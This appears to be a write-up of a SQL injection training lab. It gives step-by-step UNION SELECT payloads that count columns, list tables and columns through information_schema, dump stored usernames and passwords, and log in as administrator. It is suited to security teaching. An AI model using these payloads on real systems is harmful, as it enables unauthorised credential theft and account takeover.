This lab has a SQL injection vulnerability where we need to find and extract login credentials from the database. The application has a login function, and there's a table somewhere in the database that stores usernames and passwords.

---

### Step 1: Find out how many columns the query returns
First, I test with a single quote to confirm SQL injection is possible. Then I figure out the number of columns using UNION:

```
' UNION SELECT NULL--
```

If that doesn't work, I add more NULLs:

```
' UNION SELECT NULL, NULL--
```

When this works, I know the query returns **2 columns**. I then check if both columns can hold text:

```
' UNION SELECT 'abc', 'def'--
```

Both work, so I have **2 text columns** to work with.

---

### Step 2: Find all tables in the database
Most databases (like MySQL, PostgreSQL) have a special system table called `information_schema.tables` that stores information about all tables. I can query it:

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

This shows me a list of all tables in the database. I look through the results for something that might hold user credentials - usually names like:
- `users`
- `administrators` 
- `accounts`
- `logins`
- `customers`

Let's say I find a table called `users_sfkjha` (the name will be different in each lab instance).

---

### Step 3: Find the columns in that table
Now I need to know what columns are in that users table. I query `information_schema.columns`:

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_sfkjha'--
```

This shows me all column names in the `users_sfkjha` table. I'm looking for columns like:
- `username`, `user`, `email`, `login` (for usernames)
- `password`, `pass`, `pwd`, `hash` (for passwords)

Let's say I find `username_hsjdfk` and `password_hfjdks`.

---

### Step 4: Extract the credentials
Now I can directly query the users table:

```
' UNION SELECT username_hsjdfk, password_hfjdks FROM users_sfkjha--
```

This gives me a list of all usernames and their passwords. I look for the administrator account - it might be listed as:
- `admin`
- `administrator`
- `root`

---

### Step 5: Log in with the credentials
Once I find the administrator's password, I go to the login page and enter:
- Username: `administrator` (or whatever the username shows)
- Password: `[the password I found]`

---

### Complete Attack Chain:

1. **Test injection:** `' UNION SELECT 'abc', 'def'--`
2. **Find tables:** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
3. **Find columns:** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--`
4. **Get credentials:** `' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--`
5. **Log in as administrator**

---

### Important Notes:
- The exact table and column names will be different in each lab instance
- Some databases might require different syntax (this works for MySQL, PostgreSQL, Microsoft SQL)
- The `--` at the end comments out any remaining part of the original query
- If you see an error about too many results, you can add `LIMIT 1` or `TOP 1` to see results one at a time

### Why This Works:
The `information_schema` is like a catalog that databases maintain about themselves. It knows about all tables, columns, and other database objects. By querying it, we can explore the database structure even though we don't know any table names to start with.

Once we find the right table and columns, we can directly extract sensitive data like passwords, which lets us log in as any user - including the administrator.